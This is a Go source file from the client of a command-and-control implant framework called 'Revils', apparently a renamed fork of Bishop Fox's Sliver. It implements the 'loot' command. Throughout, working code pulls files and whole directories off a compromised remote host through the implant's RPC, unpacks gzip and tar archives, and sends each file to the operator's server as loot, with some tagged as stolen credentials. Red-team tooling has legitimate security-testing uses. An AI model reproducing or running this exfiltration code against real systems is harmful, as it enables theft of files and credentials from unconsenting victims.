package loot

/*
	Revils Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"fmt"
	"io"
	"path/filepath"
	"strings"

	"github.com/Kevin-kitnick/revils/client/console"
	"github.com/Kevin-kitnick/revils/protobuf/clientpb"
	"github.com/Kevin-kitnick/revils/protobuf/commonpb"
	"github.com/Kevin-kitnick/revils/protobuf/revilspb"
	"github.com/Kevin-kitnick/revils/util/encoders"
	"github.com/desertbit/grumble"
	"google.golang.org/protobuf/proto"
)

func ValidateLootType(lootTypeInput string) (clientpb.LootType, error) {
	var lootType clientpb.LootType
	var err error

	if lootTypeInput != "" {
		lootType, err = lootTypeFromHumanStr(lootTypeInput)
		if err != nil {
			/*
				If we get an error, that means that this loot type was invalid.
				We will leave it up to the caller to handle the error (output it
				to the console for example)
			*/
			return lootType, fmt.Errorf("Invalid loot type %s", lootTypeInput)
		}
	} else {
		lootType = clientpb.LootType_LOOT_FILE
	}

	return lootType, err
}

func ValidateLootFileType(lootFileTypeInput string, data []byte) clientpb.FileType {
	lootFileType, err := lootFileTypeFromHumanStr(lootFileTypeInput)
	if lootFileType == -1 || err != nil {
		if isText(data) {
			lootFileType = clientpb.FileType_TEXT
		} else {
			lootFileType = clientpb.FileType_BINARY
		}
	}

	return lootFileType
}

/*
	Eventually this function needs to be refactored out, but we made the decision to
	duplicate it for now
*/
func PerformDownload(remotePath string, fileName string, ctx *grumble.Context, con *console.RevilsConsoleClient) (*revilspb.Download, error) {
	ctrl := make(chan bool)
	con.SpinUntil(fmt.Sprintf("%s -> %s", fileName, "loot"), ctrl)
	download, err := con.Rpc.Download(context.Background(), &revilspb.DownloadReq{
		Request: con.ActiveTarget.Request(ctx),
		Path:    remotePath,
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		return nil, err
	}
	if download.Response != nil && download.Response.Async {
		con.AddBeaconCallback(download.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, download)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
			}
		})
		con.PrintAsyncResponse(download.Response)
	}

	if download.Response != nil && download.Response.Err != "" {
		return nil, fmt.Errorf("%s\n", download.Response.Err)
	}

	// Decode the downloaded data if required
	if download.Encoder == "gzip" {
		download.Data, err = new(encoders.Gzip).Decode(download.Data)
		if err != nil {
			return nil, fmt.Errorf("Decoding failed %s", err)
		}
	}

	return download, nil
}

func CreateLootMessage(fileName string, lootName string, lootType clientpb.LootType, lootFileType clientpb.FileType, data []byte) *clientpb.Loot {
	if lootName == "" {
		lootName = fileName
	}

	lootMessage := &clientpb.Loot{
		Name:     lootName,
		Type:     lootType,
		FileType: lootFileType,
		File: &commonpb.File{
			Name: fileName,
			Data: data,
		},
	}

	if lootType == clientpb.LootType_LOOT_CREDENTIAL {
		lootMessage.CredentialType = clientpb.CredentialType_FILE
	}

	return lootMessage
}

func SendLootMessage(loot *clientpb.Loot, con *console.RevilsConsoleClient) {
	control := make(chan bool)
	con.SpinUntil(fmt.Sprintf("Sending looted file (%s) to the server...", loot.Name), control)

	loot, err := con.Rpc.LootAdd(context.Background(), loot)
	control <- true
	<-control
	if err != nil {
		con.PrintErrorf("%s\n", err)
	}

	if loot.Name != loot.File.Name {
		con.PrintInfof("Successfully looted %s (%s) (ID: %s)\n", loot.File.Name, loot.Name, loot.LootID)
	} else {
		con.PrintInfof("Successfully looted %s (ID: %s)\n", loot.Name, loot.LootID)
	}

	return
}

func LootDownload(download *revilspb.Download, lootName string, lootType clientpb.LootType, fileType clientpb.FileType, ctx *grumble.Context, con *console.RevilsConsoleClient) {
	// Was the download successful?
	if download.Response != nil && download.Response.Err != "" {
		con.PrintErrorf("%s\n", download.Response.Err)
		return
	}

	/*  Construct everything needed to send the loot to the server
	If this is a directory, we will process each file individually
	*/

	// Let's handle the simple case of a file first
	if !download.IsDir {
		// filepath.Base does not deal with backslashes correctly in Windows paths, so we have to standardize the path to forward slashes
		downloadPath := strings.ReplaceAll(download.Path, "\\", "/")
		lootMessage := CreateLootMessage(filepath.Base(downloadPath), lootName, lootType, fileType, download.Data)
		SendLootMessage(lootMessage, con)
	} else {
		// We have to decompress the gzip file first
		decompressedDownload, err := gzip.NewReader(bytes.NewReader(download.Data))

		if err != nil {
			con.PrintErrorf("Could not decompress downloaded data: %s", err)
			return
		}

		/*
			Directories are stored as tar-ed gzip archives.
			We have gotten rid of the gzip part, now we have to sort out the tar
		*/
		tarReader := tar.NewReader(decompressedDownload)

		// Keep reading until we reach the end
		for {
			entryHeader, err := tarReader.Next()
			if err == io.EOF {
				// We have reached the end of the tar archive
				break
			}

			if err != nil {
				// Something is wrong with this archive. Stop reading.
				break
			}

			if entryHeader == nil {
				/*
					If the entry is nil, skip it (not sure when this would happen,
						but we do not want to attempt operations on something that is nil)
				*/
				continue
			}

			if entryHeader.Typeflag == tar.TypeDir {
				// Keep going to dig into the directory
				continue
			}
			// The implant should have only shipped us files (the implant resolves symlinks)

			// Create a loot message for this file and ship it
			/* Using io.ReadAll because it reads until EOF. We have already read the header, so the next EOF should
			be the end of the file
			*/
			fileData, err := io.ReadAll(tarReader)
			if err == nil {
				lootMessage := CreateLootMessage(filepath.Base(entryHeader.Name), lootName, lootType, fileType, fileData)
				SendLootMessage(lootMessage, con)
			}
		}
	}
}

// LootAddRemoteCmd - Add a file from the remote system to the server as loot
func LootAddRemoteCmd(ctx *grumble.Context, con *console.RevilsConsoleClient) {
	session := con.ActiveTarget.GetSessionInteractive()
	if session == nil {
		return
	}
	remotePath := ctx.Args.String("path")
	fileName := filepath.Base(remotePath)
	name := ctx.Flags.String("name")

	lootType, err := ValidateLootType(ctx.Flags.String("type"))
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}

	download, err := PerformDownload(remotePath, fileName, ctx, con)
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}

	// Determine type based on download buffer
	lootFileType := ValidateLootFileType(ctx.Flags.String("file-type"), download.Data)
	LootDownload(download, name, lootType, lootFileType, ctx, con)
}
